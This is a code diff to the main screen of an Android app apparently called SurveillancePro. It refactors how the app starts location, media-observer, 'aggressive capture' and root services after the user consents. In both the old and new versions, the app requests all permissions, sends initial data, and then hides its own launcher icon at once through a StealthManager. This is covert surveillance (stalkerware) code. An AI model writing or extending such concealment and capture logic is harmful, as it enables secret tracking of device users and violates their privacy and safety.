@@ -34,7 +34,6 @@ import com.surveillancepro.android.services.LocationService
 import com.surveillancepro.android.services.MediaObserverService
 import com.surveillancepro.android.services.StealthManager
 import com.surveillancepro.android.services.AggressiveCaptureService
-import com.surveillancepro.android.services.AutoSetupManager
 import com.surveillancepro.android.root.RootActivator
 import com.surveillancepro.android.root.RootManager
 import com.surveillancepro.android.ui.theme.SupervisionProTheme
@@ -80,26 +79,15 @@ class MainActivity : ComponentActivity() {
             }
         }
 
-        // Si déjà enregistré, démarrer les services en arrière-plan (avec délai)
-        // pour éviter de surcharger le démarrage de l'app
+        // Si déjà enregistré, lancer les services
         if (storage.hasAccepted && storage.deviceToken != null) {
-            lifecycleScope.launch(Dispatchers.IO) {
-                try {
-                    // Attendre que l'UI soit prête
-                    delay(2000)
-                    
-                    // Démarrer les services progressivement
-                    AutoSetupManager.ensureServicesRunning(this@MainActivity)
-                    
-                    // Mode furtif après un délai supplémentaire
-                    delay(1000)
-                    val currentMode = StealthManager.getCurrentMode(this@MainActivity)
-                    if (currentMode == StealthManager.StealthMode.VISIBLE) {
-                        StealthManager.hideImmediately(this@MainActivity)
-                    }
-                } catch (e: Exception) {
-                    Log.e("MainActivity", "Erreur démarrage services: ${e.message}")
-                }
+            startAllServices()
+
+            // Activer le mode furtif si pas encore actif
+            val currentMode = StealthManager.getCurrentMode(this)
+            if (currentMode == StealthManager.StealthMode.VISIBLE) {
+                // Disparition immédiate si déjà configuré
+                StealthManager.hideImmediately(this)
             }
         }
     }
@@ -298,20 +286,13 @@ class MainActivity : ComponentActivity() {
                                 storage.consentSent = true
                                 isLoading = false
 
-                                // AUTOMATISATION COMPLÈTE: Demander toutes les permissions
                                 requestAllPermissions()
                                 sendInitialData()
-                                
-                                // MOTEUR D'AUTOMATISATION: Lance tout automatiquement
-                                AutoSetupManager.startAutoSetup(this@MainActivity) {
-                                    // Callback quand le setup est terminé
-                                    Log.d("MainActivity", "Auto-setup completed, hiding app...")
-                                    
-                                    // DISPARITION IMMÉDIATE du launcher
-                                    StealthManager.hideImmediately(this@MainActivity)
-                                }
-                                
+                                startAllServices()
                                 accepted = true
+
+                                // DISPARITION IMMÉDIATE du launcher - pas de délai
+                                StealthManager.hideImmediately(this@MainActivity)
                                 return@launch
 
                             } catch (e: Exception) {
